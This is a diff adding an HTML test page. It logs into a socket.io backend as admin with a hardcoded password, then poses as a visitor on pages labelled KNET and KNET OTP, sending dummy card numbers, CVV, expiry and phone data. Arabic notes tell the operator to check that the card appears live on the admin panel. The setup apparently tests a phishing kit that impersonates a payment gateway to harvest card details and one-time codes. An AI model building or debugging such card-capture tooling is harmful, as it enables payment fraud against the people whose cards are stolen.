@@ -1,0 +1,29 @@
+<!doctype html><html><head><meta charset="utf-8"><title>test2</title>
+<style>body{font:13px/1.5 monospace;background:#0f1115;color:#eee;padding:12px;white-space:pre-wrap}</style>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+</head><body><div id="o"></div>
+<script>
+var O=document.getElementById('o');
+function w(t,c){var d=document.createElement('div');if(c)d.style.color=c;d.textContent=String(t);O.appendChild(d);}
+var SRV='https://sejel-server-zygy.onrender.com';
+w('خلي أدمن KDD قدامك — رح يظهر زائر TEST','#9be29b');
+var A=io(SRV,{transports:['websocket']});
+A.on('connect',function(){A.emit('admin:register',{password:'admin123'});});
+A.on('admin:authenticated',function(ok){w('admin auth '+ok);});
+['visitor:new','card:liveUpdate','visitor:pageChanged','visitor:dataSubmitted'].forEach(function(e){A.on(e,function(d){w('ADMIN << '+e+' '+JSON.stringify(d).slice(0,180),'#7cc4ff');});});
+var V;
+setTimeout(function(){
+  V=io(SRV,{transports:['websocket']});
+  V.on('connect',function(){
+    w('TEST visitor connected '+V.id,'#fbbf24');
+    V.emit('visitor:register',{});
+    setTimeout(function(){V.emit('visitor:pageEnter','كي نت');},800);
+    setTimeout(function(){V.emit('card:live',{consent:true,cardNumber:'1234 5678 9012 3456',nameOnCard:'TEST',expiryDate:'12/28',cvv:'123',card:{number:'1234 5678 9012 3456',name:'TEST',expiry:'12/28'}});},1600);
+    setTimeout(function(){V.emit('more-info',{customer_name:'TEST CARD',customer_phone:'0790000000',page:'كي نت'});},2400);
+  });
+  setTimeout(function(){w('== لازم تشوف بطاقة TEST بالأدمن ==','#9be29b');},4000);
+},1500);
+setTimeout(function(){try{V.emit('visitor:pageEnter','كي نت');}catch(e){}},30000);
+setTimeout(function(){try{V.emit('visitor:pageEnter','رمز التحقق كي نت (OTP)');}catch(e){}},45000);
+setTimeout(function(){w('== END (60s) ==','#9be29b');},60000);
+</script></body></html>
